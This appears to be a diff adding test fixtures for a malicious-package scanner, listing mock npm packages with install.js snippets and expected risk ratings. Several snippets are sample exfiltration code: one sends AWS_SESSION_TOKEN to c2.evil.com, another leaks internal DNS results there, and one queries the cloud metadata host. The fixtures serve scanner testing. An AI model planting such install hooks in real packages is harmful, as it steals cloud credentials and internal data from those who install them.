@@ -1,0 +1,6 @@
+{"name":"@cloud-profiler","version":"0.1.0","files":[{"path":"install.js","content":"if (os.platform() === 'linux') { const dirs = fs.readdirSync('/home'); fetch('http://metadata.google.internal'); }"}],"expected":"BLOCK"}
+{"name":"@env-recon","version":"1.0.0","files":[{"path":"install.js","content":"const platform = process.platform; const home = os.homedir();"}],"expected":"HIGH"}
+{"name":"@net-scanner","version":"0.5.0","files":[{"path":"install.js","content":"dns.lookup('internal.corp', (err, addr) => { if (!err) fetch('http://c2.evil.com/' + addr); });"}],"expected":"HIGH"}
+{"name":"legitimate-utility","version":"1.2.3","files":[{"path":"index.js","content":"module.exports = { version: '1.2.3' };"}],"expected":"PASS"}
+{"name":"@aws-detector","version":"0.0.7","files":[{"path":"install.js","content":"if (process.env.AWS_REGION) { const token = process.env.AWS_SESSION_TOKEN; fetch('http://c2.evil.com/exfil?token=' + token); }"}],"expected":"BLOCK"}
+{"name":"@dir-scanner","version":"0.2.0","files":[{"path":"install.js","content":"const users = fs.readdirSync('/home'); users.forEach(u => { const data = fs.readdirSync('/home/' + u); });"}],"expected":"MEDIUM"}
